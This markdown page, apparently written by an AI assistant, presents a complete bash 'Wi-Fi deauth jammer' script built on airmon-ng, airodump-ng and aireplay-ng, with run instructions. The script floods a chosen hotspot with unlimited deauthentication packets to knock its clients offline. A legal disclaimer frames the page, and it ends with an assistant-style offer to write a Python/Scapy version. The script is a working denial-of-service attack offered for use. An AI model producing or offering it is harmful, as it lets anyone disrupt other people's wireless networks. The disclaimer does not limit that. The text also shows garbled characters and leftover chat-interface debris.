# ‚ö†Ô∏è Ethical Wi-Fi Hotspot Jamming (Educational Use Only)

<Warning title="Important Legal Notice">
Jamming or disrupting Wi-Fi networks without explicit permission is **illegal** and considered a **Denial of Service (DoS)** attack under cybersecurity laws. Only use the following on **your own test networks** or with clear **written authorization**.
</Warning>

## ‚úÖ What We‚Äôll Do

We‚Äôll create a script that sends deauthentication packets to disconnect devices from a nearby Wi-Fi hotspot.

## üõ†Ô∏è Prerequisites

- Linux system (e.g., **Kali Linux**)
- Wireless card that supports **monitor mode** and **packet injection**
- `aircrack-ng` suite installed

## üìú Bash Script: Wi-Fi Deauth Jammer

```bash
#!/bin/bash

# Check for required tools
if ! command -v airmon-ng &> /dev/null || ! command -v aireplay-ng &> /dev/null; then
    echo "[!] Please install aircrack-ng first."
    exit 1
fi

echo "[*] Starting Wi-Fi hotspot jammer (deauth packets)..."

# Put interface into monitor mode
echo "[*] Enabling monitor mode..."
read -p "Enter your Wi-Fi interface name (e.g., wlan0): " iface
airmon-ng start $iface
mon_iface="${iface}mon"

# Scan for nearby networks
echo "[*] Scanning for nearby Wi-Fi networks. Press Ctrl+C when done."
airodump-ng $mon_iface

# Ask for target details
read -p "Enter target BSSID (MAC of Wi-Fi hotspot): " bssid
read -p "Enter target channel (CH): " channel

# Set monitor interface to the correct channel
echo "[*] Setting channel to $channel"
iwconfig $mon_iface channel $channel

# Start jamming
echo "[*] Starting deauthentication attack on $bssid..."
sleep 2
aireplay-ng --deauth 0 -a $bssid $mon_iface
```
## ‚öôÔ∏è How to Run
Save the script as wifi_jammer.sh

Make it executable:

```bash
Edit
chmod +x wifi_jammer.sh
```
Run with sudo:

```bash
Edit
sudo ./wifi_jammer.sh
```
## üß† How It Works
Enables monitor mode with airmon-ng

Scans networks using airodump-ng

Sends continuous deauth packets to target BSSID using aireplay-ng

<Tip title="Bonus: Python Version"> Want a Python + Scapy version of this Wi-Fi jammer script? Let me know and I‚Äôll generate it for you. </Tip> ```
Let me know if you want this adapted for a specific platform like Docusaurus, Next.js, or something else‚Äîor if you want that Python version.
